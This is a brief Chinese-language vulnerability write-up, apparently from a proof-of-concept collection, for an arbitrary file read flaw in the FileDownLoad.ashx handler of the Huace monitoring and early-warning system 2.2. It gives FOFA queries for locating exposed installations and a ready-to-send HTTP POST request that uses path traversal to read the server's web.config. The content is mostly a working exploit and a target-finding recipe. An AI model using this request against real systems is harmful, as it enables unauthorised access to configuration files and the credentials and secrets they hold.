# 华测监测预警系统FileDownLoad.ashx存在任意文件读取漏洞

华测监测预警系统FileDownLoad.ashx存在任意文件读取漏洞，通过读取配置文件获取重要数据。

## fofa

```jade
app="华测监测预警系统2.2"
```

```javascript
icon_hash="-628229493"
```

## poc

```javascript
POST /Handler/FileDownLoad.ashx HTTP/1.1
Host: ip:port
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

filename=1&filepath=../../web.config
```

